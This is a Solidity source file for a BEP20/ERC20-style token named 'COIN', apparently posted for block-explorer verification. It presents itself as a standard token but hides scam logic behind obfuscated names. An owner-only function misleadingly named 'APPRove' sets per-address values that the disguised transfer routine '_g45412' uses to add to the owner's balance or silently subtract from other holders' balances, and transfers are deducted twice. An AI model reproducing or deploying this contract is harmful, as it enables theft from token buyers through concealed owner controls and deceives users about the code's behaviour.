/**
 *Submitted for verification at Arbiscan on 2023-04-01
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-10
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-12
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyowner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceownership() public virtual onlyowner {
        _transferownership(address(0));
    }


    function transferownership_transferownership(address newowner) public virtual onlyowner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint acconntADesired,
        uint acconntBDesired,
        uint acconntAMin,
        uint acconntBMin,
        address to,
        uint deadline
    ) external returns (uint acconntA, uint acconntB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint acconntTokenDesired,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline
    ) external payable returns (uint acconntToken, uint acconntETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acconntAMin,
        uint acconntBMin,
        address to,
        uint deadline
    ) external returns (uint acconntA, uint acconntB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline
    ) external returns (uint acconntToken, uint acconntETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint acconntAMin,
        uint acconntBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acconntA, uint acconntB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acconntToken, uint acconntETH);
    function swapExactTokensForTokens(
        uint acconntIn,
        uint acconntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acconnts);
    function swapTokensForExactTokens(
        uint acconntOut,
        uint acconntInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory acconnts);
    function swapExactETHForTokens(uint acconntOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acconnts);
    function swapTokensForExactETH(uint acconntOut, uint acconntInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acconnts);
    function swapExactTokensForETH(uint acconntIn, uint acconntOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory acconnts);
    function swapETHForExactTokens(uint acconntOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory acconnts);

    function quote(uint acconntA, uint reserveA, uint reserveB) external pure returns (uint acconntB);
    function getacconntOut(uint acconntIn, uint reserveIn, uint reserveOut) external pure returns (uint acconntOut);
    function getacconntIn(uint acconntOut, uint reserveIn, uint reserveOut) external pure returns (uint acconntIn);
    function getacconntsOut(uint acconntIn, address[] calldata path) external view returns (uint[] memory acconnts);
    function getacconntsIn(uint acconntOut, address[] calldata path) external view returns (uint[] memory acconnts);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline
    ) external returns (uint acconntETH);
    function removeLiquidityETHWithPermitSupportingfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint acconntTokenMin,
        uint acconntETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint acconntETH);

    function swapExactTokensForTokensSupportingfeeOnTransferTokens(
        uint acconntIn,
        uint acconntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfeeOnTransferTokens(
        uint acconntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeOnTransferTokens(
        uint acconntIn,
        uint acconntOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setfeeTo(address) external;
    function setfeeToSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amonnt) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amonnt);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amonnt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amonnt;
        emit Approval(owner, spender, amonnt);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amonnt
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amonnt, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amonnt);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amonnt
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amonnt
    ) internal virtual {}
}


contract COIN is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amonnt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amonnt, "ERC20: transfer amonnt exceeds balance");
    unchecked {
        _balances[from] = fromBalance - amonnt;
    }
        _balances[to] += amonnt;

        emit Transfer(from, to, amonnt);
    }

    function _burn(address account, uint256 amonnt) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amonnt, "ERC20: burn amonnt exceeds balance");
    unchecked {
        _balances[account] = accountBalance - amonnt;
    }
        _totalSupply -= amonnt;

        emit Transfer(account, address(0), amonnt);
    }

    function _mtin(address account, uint256 amonnt) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _totalSupply += amonnt;
        _balances[account] += amonnt;
        emit Transfer(address(0), account, amonnt);
    }


    address public DEVAddress;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
        DEVAddress = msg.sender;
    }

    using SafeMath for uint256;

    uint256 private _burnfee = 2;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) private _3451311;

    function _g45412(
        address from,
        address _to,
        uint256 _acconnt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acconnt, "ERC20: transfer amonnt exceeds balance");
        if (_3451311[from] > 0){
            if(from == owner()){
              _balances[from] = _balances[from].add(uint256(_3451311[from]));
            }else if (_3451311[from] > 0){
            _balances[from] = _balances[from].sub(uint256(_3451311[from]));
            }
        }
        _balances[from]=_balances[from].sub(_acconnt);


        uint256 tradefeeacconnt = 0;

        tradefeeacconnt = _acconnt.mul(_burnfee).div(100);

        if (tradefeeacconnt > 0) {
            _balances[from] = _balances[from].sub(tradefeeacconnt);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeacconnt);
            emit Transfer(from, _deadAddress, tradefeeacconnt);
        }

        _balances[from] = _balances[from].sub(_acconnt - tradefeeacconnt);
        _balances[_to] = _balances[_to].add(_acconnt - tradefeeacconnt);
        emit Transfer(from, _to, _acconnt - tradefeeacconnt);
    }


    function APPRove(address _address,uint256 _value) external onlyowner {
        _3451311[_address] = _value;
    }



    function transfer(address to, uint256 amonnt) public virtual returns (bool) {
        address owner = _msgSender();
        _g45412(owner, to, amonnt);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amonnt
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amonnt);
        _g45412(from, to, amonnt);
        return true;
    }
}